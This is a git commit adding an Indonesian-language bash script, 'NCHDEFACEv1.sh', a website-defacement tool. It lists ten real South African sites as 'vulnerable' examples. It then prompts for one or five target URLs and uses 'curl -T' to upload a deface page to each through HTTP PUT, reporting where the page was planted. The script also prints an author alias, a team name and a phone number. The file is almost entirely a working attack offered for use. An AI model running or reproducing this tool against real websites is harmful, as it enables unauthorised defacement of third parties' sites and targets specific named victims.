63ddc52418e89041147e1d77d8793ad78cd194a4
ibar12345 <44119179+ibar12345@users.noreply.github.com>
2018-10-22 18:26:06 +0700

    Noob

---
+++ NCHDEFACEv1.sh
@@ -0,0 +1,173 @@
+#usr/bin/bash
+#recode itu jelek ya asw
+#hargai karya orang njir:v
+#noob mah bebas
+#version 1
+clear
+green="\033[32;1m"
+yellow="\033[33;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+figlet NCH.DEFACEv1 | lolcat
+echo "^_^___________________________________________________________^_^" | lolcat
+echo "[AUTHOR       ] : Mr.X ForAKA96 " |lolcat
+echo "[TEAM         ] : NEWBIE CYBER HACKED " |lolcat
+echo "[VERSION TOOLS] : V.1" | lolcat
+echo "[KONTAK       ] : 081230754052" | lolcat
+echo "[NOTES        ] : simpan script di memori internal " | lolcat
+echo "^_^___________________________________________________________^_^" | lolcat
+sleep 1
+echo " "
+echo   "《=======================CONTOH WEB VULN=======================》" | lolcat
+echo $green "1.> http://colourfactory.co.za  " | lolcat
+echo $purple "2.> http://contsol.co.za  " | lolcat
+echo $cyan "3.> http://tcnig.co.za " | lolcat
+echo $red "4.> http://centraltech.co.za " | lolcat
+echo $white "5.> http://cmweb.co.za " | lolcat
+echo $yellow "6.> http://democonstruction.co.za " | lolcat
+echo  $blue "7.>  http://gofiguretraining.co.za " | lolcat
+echo $green "8.> http://homebuzz.co.za " | lolcat
+echo $purple "9.> http://clcooling.co.za " | lolcat
+echo $cyan "10.> http://sportspod.co.za " | lolcat
+echo "《=============================================================》" | lolcat
+echo " "
+sleep 1
+echo "《==================GUNAKAN TOOLS DENGAN BIJAK=================》" | lolcat
+echo " "
+echo $red "01.> DEFACE 1 "
+echo "____________________________" | lolcat
+echo $yellow "02.> DEFACE 2 "
+echo "____________________________" | lolcat
+echo $purle "00.> EXIT "
+echo "____________________________" | lolcat
+echo "\033[32;1m"
+read -p "N.C.H~Mr.X ForAKA96~#" bro
+
+if [ $bro = 01 ] || [ $bro = 01 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo $green " Masukan Target!!! "
+read -p "=====>" target
+echo $cyan "Masukan Nama script kalian"
+read -p "=====>" script
+curl -T /storage/emulated/0/$script $target
+echo "\033[33;1m"
+echo "Selesai!!!... ($target/$script) "
+fi
+
+if [ $bro = 02 ] || [ $bro = 02 ]
+then
+clear
+figlet Mr.X ForAKA96 | lolcat
+echo "\033[31;1m"
+echo "Masukan nama script!!!..."
+read -p "=======>>>" script
+echo "\033[35;1mMasukan Web Target Ke1"
+read -p "=======>>>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo "\033[34;1mMasukan Web Target Ke2 "
+read -p "=======>>>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo "\033[33;1mMasukan Web Target Ke3"
+read -p "=======>>>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo "\033[32;1mMasukan Web Target Ke4"
+read -p "=======>>>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo "\033[36;1mMasukan Web Target Ke5"
+read -p "=======>>>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo "《=========================SEDANG PROSES=======================》" | lolcat
+sleep 1
+echo $green "Silahkan Cek Web ($Ke1/$script)"
+echo $purple "Silahkan Cek Web ($Ke2/$script)"
+echo $cyan "Silahkan Cek Web ($Ke3/$script)"
+echo $yellow "Silahkan Cek Web ($Ke4/$script)"
+echo $red "Silahkan Cek Web ($Ke5/$script)"
+echo "《=============================================================》" | lolcat
+fi
+
+if [ $bro = 00 ] || [ $bro = 00 ]
+then
+clear
+echo "\033[31;1mNEWBIE CYBER HACKED😍"
+sleep 2
+echo "\033[32;1mTERIMA KASIH STAH:V😎"
+sleep 2
+echo "\033[33;1mWASSALAMUALAIKUM😴"
+exit
+fi
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
